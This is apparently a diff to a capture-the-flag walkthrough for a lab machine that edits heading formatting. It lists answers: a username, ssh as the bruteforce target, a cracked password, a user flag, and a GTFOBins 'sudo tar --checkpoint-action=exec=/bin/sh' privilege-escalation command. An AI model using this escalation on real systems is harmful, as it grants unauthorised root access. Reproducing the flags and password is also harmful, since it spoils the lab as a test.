@@ -8,30 +8,30 @@
 export IP=10.10.133.27
 ```
 
-# 3 Who wrote the task list? 
+# #3 Who wrote the task list? 
 ## Answer
 ```
 lin
 ```
 
-#4 What service can you bruteforce with the text file found?
+# #4 What service can you bruteforce with the text file found?
 ```
 ssh
 ```
 
-#5 User's password?
+# #5 User's password?
 ## Answer
 ```
 RedDr4gonSynd1cat3
 ```
 
-#6 user.txt
+# #6 user.txt
 ## Answer
 ```
 THM{CR1M3_SyNd1C4T3}
 ```
 
-#7 root.txt
+# #7 root.txt
 Checked `sudo -l` and got `tar` allowed to run as superuser.
 
 ## From: https://gtfobins.github.io/gtfobins/tar/
@@ -39,7 +39,7 @@ Checked `sudo -l` and got `tar` allowed to run as superuser.
 If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
 
 ```bash
-   sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 ```
 
 ## Answer
